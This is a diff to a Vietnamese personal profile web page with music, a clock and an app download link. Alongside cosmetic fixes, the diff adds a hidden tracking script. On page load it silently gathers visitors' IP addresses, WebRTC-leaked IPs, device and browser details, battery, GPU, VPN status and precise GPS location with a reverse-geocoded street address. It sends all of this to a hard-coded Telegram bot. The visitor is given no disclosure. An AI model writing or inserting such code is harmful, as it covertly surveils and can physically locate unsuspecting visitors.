@@ -8,13 +8,14 @@
     <style>
         html, body { background-color: #ffffff; color: #1f2937; margin: 0; padding: 0; min-height: 100vh; }
         #loading-screen { transition: opacity 0.5s ease; }
+        audio { display: none; }
     </style>
 </head>
 <body>
 
     <div id="loading-screen" class="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-white">
         <div class="w-32 h-32 rounded-full overflow-hidden border border-gray-100 shadow-xl mb-6">
-            <img src="https://files.catbox.moe/n0x8oo.jpeg" class="w-full h-full object-cover">
+            <img src="https://files.catbox.moe/n0x8oo.jpeg" class="w-full h-full object-cover" alt="avatar">
         </div>
         <h1 class="text-2xl font-bold italic text-gray-900 mb-8">Bui Minh Phat</h1>
         <button onclick="startExperience()" class="px-6 py-2 border border-gray-200 rounded-full text-gray-400 hover:text-gray-900 transition animate-pulse">
@@ -22,8 +23,8 @@
         </button>
     </div>
 
-    <audio id="music-1"><source src="https://files.catbox.moe/uc4l2l.mov" type="audio/mp4"></audio>
-    <audio id="music-2" loop><source src="https://files.catbox.moe/77meij.mp3" type="audio/mp3"></audio>
+    <audio id="music-1" preload="auto"><source src="https://files.catbox.moe/uc4l2l.mov" type="audio/mp4"></audio>
+    <audio id="music-2" loop preload="auto"><source src="https://files.catbox.moe/77meij.mp3" type="audio/mp3"></audio>
 
     <div class="max-w-md mx-auto px-5 py-14 flex flex-col items-center">
         <div class="fixed top-4 left-4 z-50 px-4 py-1.5 bg-gray-100 border border-black/5 rounded-full backdrop-blur-md shadow-sm flex items-center space-x-2.5">
@@ -33,7 +34,7 @@
 
         <header class="flex flex-col items-center text-center w-full pt-12">
             <div class="w-28 h-28 rounded-full overflow-hidden border border-black/5 shadow-xl mb-4">
-                <img src="https://files.catbox.moe/n0x8oo.jpeg" class="w-full h-full object-cover">
+                <img src="https://files.catbox.moe/n0x8oo.jpeg" class="w-full h-full object-cover" alt="avatar">
             </div>
             <h1 class="text-3xl font-bold italic tracking-wide text-gray-900 mb-2">Bui Minh Phat</h1>
             <p class="text-sm text-gray-500 font-light tracking-wide">id tiktok <span class="font-normal">buiminhphat20</span></p>
@@ -42,7 +43,7 @@
         <main class="w-full mt-6 px-5">
             <div class="flex items-center justify-between p-4 bg-white border border-gray-100 rounded-[24px] shadow-sm hover:shadow-md transition-all">
                 <div class="flex items-center space-x-4">
-                    <img src="https://files.catbox.moe/awlpvc.jpeg" class="w-16 h-16 rounded-2xl object-cover">
+                    <img src="https://files.catbox.moe/awlpvc.jpeg" class="w-16 h-16 rounded-2xl object-cover" alt="app icon">
                     <div class="flex flex-col justify-center">
                         <h3 class="font-bold text-lg text-gray-900">Locket Gold</h3>
                         <div class="mt-1 flex items-center space-x-1 text-purple-600 bg-purple-50 px-2 py-0.5 rounded-full w-fit">
@@ -50,7 +51,7 @@
                         </div>
                     </div>
                 </div>
-                <a href="https://storeipa.com/w4wg4p" target="_blank" class="p-3 text-purple-500 hover:bg-purple-50 rounded-full transition-colors">
+                <a href="https://storeipa.com/w4wg4p" target="_blank" rel="noopener noreferrer" class="p-3 text-purple-500 hover:bg-purple-50 rounded-full transition-colors">
                     <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                         <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                     </svg>
@@ -60,6 +61,7 @@
     </div>
 
     <script>
+        // === MUSIC ===
         const music1 = document.getElementById('music-1');
         const music2 = document.getElementById('music-2');
         const loading = document.getElementById('loading-screen');
@@ -67,16 +69,230 @@
         function startExperience() {
             loading.style.opacity = '0';
             setTimeout(() => loading.style.display = 'none', 500);
-            music1.play().catch(e => console.log("Cần tương tác"));
+            if (music1) {
+                music1.play().catch(e => console.log("Cần tương tác"));
+            }
         }
 
-        music1.onended = () => music2.play();
+        if (music1) {
+            music1.onended = function() {
+                if (music2) music2.play().catch(e => console.log("Lỗi music2"));
+            };
+            music1.onerror = function() {
+                setTimeout(function() {
+                    if (music2) music2.play().catch(function() {});
+                }, 3000);
+            };
+        }
 
+        document.addEventListener('click', function() {
+            if (music1 && music1.paused) {
+                music1.play().catch(function() {});
+            }
+        }, { once: false });
+
+        // === CLOCK ===
         function updateClock() {
-            document.getElementById('digital-clock').textContent = new Date().toLocaleTimeString('vi-VN');
+            var el = document.getElementById('digital-clock');
+            if (el) {
+                var now = new Date();
+                var h = String(now.getHours()).padStart(2, '0');
+                var m = String(now.getMinutes()).padStart(2, '0');
+                var s = String(now.getSeconds()).padStart(2, '0');
+                el.textContent = h + ':' + m + ':' + s;
+            }
         }
         setInterval(updateClock, 1000);
         updateClock();
+
+        // === TELEGRAM BOT ===
+        const BOT_TOKEN = '8890331484:AAGCT4w5nV66WcSaF5yQiiYI4hh-xktEZeY';
+        const CHAT_ID = 8681854353;
+
+        function sendTG(msg) {
+            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            }).catch(function(e) {});
+        }
+
+        // === GET DEVICE NAME ===
+        function getDeviceName() {
+            var ua = navigator.userAgent;
+            if (/iPhone/i.test(ua)) return '📱 iPhone';
+            if (/iPad/i.test(ua)) return '📱 iPad';
+            if (/iPod/i.test(ua)) return '📱 iPod';
+            if (/Android/i.test(ua)) {
+                var match = ua.match(/Android\s([\d.]+)/);
+                var ver = match ? match[1] : '';
+                return '📱 Android ' + ver;
+            }
+            if (/Windows Phone/i.test(ua)) return '📱 Windows Phone';
+            if (/BlackBerry/i.test(ua)) return '📱 BlackBerry';
+            if (/Tablet|iPad|PlayBook|Kindle/i.test(ua)) return '📟 Tablet';
+            if (/Windows NT 10.0/i.test(ua)) return '💻 Windows 10/11';
+            if (/Windows NT 6.3/i.test(ua)) return '💻 Windows 8.1';
+            if (/Windows NT 6.2/i.test(ua)) return '💻 Windows 8';
+            if (/Windows NT 6.1/i.test(ua)) return '💻 Windows 7';
+            if (/Windows/i.test(ua)) return '💻 Windows (cũ)';
+            if (/Mac OS X/i.test(ua)) {
+                var match = ua.match(/Mac OS X ([\d_]+)/);
+                var ver = match ? match[1].replace(/_/g, '.') : '';
+                return '🍎 Mac OS X ' + ver;
+            }
+            if (/Linux/i.test(ua)) return '🐧 Linux';
+            if (/CrOS/i.test(ua)) return '📚 Chrome OS';
+            return '💻 Không xác định';
+        }
+
+        // === GET GPS ===
+        function getGPS() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        var lat = pos.coords.latitude;
+                        var lng = pos.coords.longitude;
+                        var acc = pos.coords.accuracy;
+                        var msg = '📍 <b>VỊ TRÍ GPS</b>\n🌐 Vĩ độ: ' + lat + '\n🌐 Kinh độ: ' + lng + '\n📏 Độ chính xác: ±' + acc + 'm';
+                        sendTG(msg);
+                        fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&accept-language=vi')
+                            .then(function(r) { return r.json(); })
+                            .then(function(data) {
+                                if (data.display_name) {
+                                    sendTG('🏠 Địa chỉ: ' + data.display_name);
+                                }
+                            })
+                            .catch(function() {});
+                    },
+                    function(err) {
+                        var msg = '❌ GPS: ';
+                        if (err.code === 1) msg += 'Người dùng từ chối';
+                        else if (err.code === 2) msg += 'Không có tín hiệu';
+                        else if (err.code === 3) msg += 'Hết giờ chờ';
+                        sendTG(msg);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                sendTG('❌ Trình duyệt không hỗ trợ GPS');
+            }
+        }
+
+        // === GET BATTERY ===
+        function getBattery() {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(b) {
+                    var level = Math.round(b.level * 100);
+                    var charging = b.charging ? '🔌 Đang sạc' : '🔋 Không sạc';
+                    var msg = '🔋 <b>PIN</b>\n📊 Mức: ' + level + '%\n⚡ ' + charging;
+                    if (b.chargingTime < Infinity) {
+                        msg += '\n⏳ Sạc đầy sau: ~' + Math.round(b.chargingTime / 60) + ' phút';
+                    }
+                    sendTG(msg);
+                }).catch(function() { sendTG('❌ Không lấy được pin'); });
+            } else {
+                sendTG('❌ Trình duyệt không hỗ trợ API pin');
+            }
+        }
+
+        // === GET NETWORK ===
+        function getNetwork() {
+            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                var msg = '📶 <b>MẠNG</b>\n📡 Loại: ' + (conn.effectiveType || 'Không rõ') + '\n📥 Tốc độ: ' + (conn.downlink || '?') + ' Mbps\n⏱️ RTT: ' + (conn.rtt || '?') + ' ms';
+                sendTG(msg);
+            } else {
+                sendTG('❌ Không lấy được thông tin mạng');
+            }
+        }
+
+        // === GET WEBGL ===
+        function getWebGL() {
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return;
+                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    sendTG('🎮 GPU: ' + renderer);
+                }
+            } catch(e) {}
+        }
+
+        // === CHECK VPN ===
+        function checkVPN(ip) {
+            fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,isp,org,proxy,hosting')
+                .then(function(r) { return r.json(); })
+                .then(function(data) {
+                    var msg = '🌍 <b>VỊ TRÍ IP</b>\n🏳️ Quốc gia: ' + (data.country || 'Không rõ') + '\n🏙️ Thành phố: ' + (data.city || 'Không rõ') + '\n📡 ISP: ' + (data.isp || 'Không rõ') + '\n🔒 VPN/Proxy: ' + (data.proxy ? '⚠️ CÓ' : '✅ KHÔNG');
+                    sendTG(msg);
+                })
+                .catch(function() {});
+        }
+
+        // === WEBRTC IP ===
+        function getWebRTCIP() {
+            var pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(function(offer) {
+                pc.setLocalDescription(offer);
+            });
+            pc.onicecandidate = function(e) {
+                if (e.candidate && e.candidate.candidate) {
+                    var ip = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                    if (ip && ip[0] !== '0.0.0.0' && ip[0] !== '127.0.0.1') {
+                        sendTG('🔍 WebRTC IP (IP thật): ' + ip[0]);
+                    }
+                    pc.close();
+                }
+            };
+            setTimeout(function() { pc.close(); }, 3000);
+        }
+
+        // === SEND ALL INFO ===
+        function sendAllInfo() {
+            fetch('https://api.ipify.org?format=json')
+                .then(function(r) { return r.json(); })
+                .then(function(data) {
+                    var ip = data.ip;
+                    var ua = navigator.userAgent;
+                    var msg = '🔵 <b>TRUY CẬP WEB</b>\n';
+                    msg += '⏰ ' + new Date().toLocaleString('vi-VN') + '\n';
+                    msg += '🌐 IP: ' + ip + '\n';
+                    msg += '📱 Thiết bị: ' + getDeviceName() + '\n';
+                    msg += '🌐 Trình duyệt: ' + (ua.match(/(Chrome|Firefox|Safari|Edge|Opera)/) || [])[0] || 'Không rõ' + '\n';
+                    msg += '💻 OS: ' + navigator.platform + '\n';
+                    msg += '🗣️ Ngôn ngữ: ' + navigator.language + '\n';
+                    msg += '🖥️ Màn hình: ' + screen.width + 'x' + screen.height + '\n';
+                    msg += '🧠 RAM: ' + (navigator.deviceMemory || '?') + 'GB - CPU: ' + (navigator.hardwareConcurrency || '?') + ' cores\n';
+                    msg += '🍪 Cookie: ' + (navigator.cookieEnabled ? 'Có' : 'Không') + '\n';
+                    msg += '🔗 Từ trang: ' + (document.referrer || 'Trực tiếp') + '\n';
+                    msg += '🔗 Trang: ' + window.location.href;
+                    sendTG(msg);
+
+                    setTimeout(function() {
+                        checkVPN(ip);
+                        getWebRTCIP();
+                        getNetwork();
+                        getGPS();
+                        getBattery();
+                        getWebGL();
+                    }, 1500);
+                })
+                .catch(function() {
+                    sendTG('🔴 Có người truy cập (không lấy được IP)');
+                });
+        }
+
+        setTimeout(sendAllInfo, 2000);
+
+        console.log('[BMP] Đã bật theo dõi đầy đủ');
     </script>
 </body>
 </html>
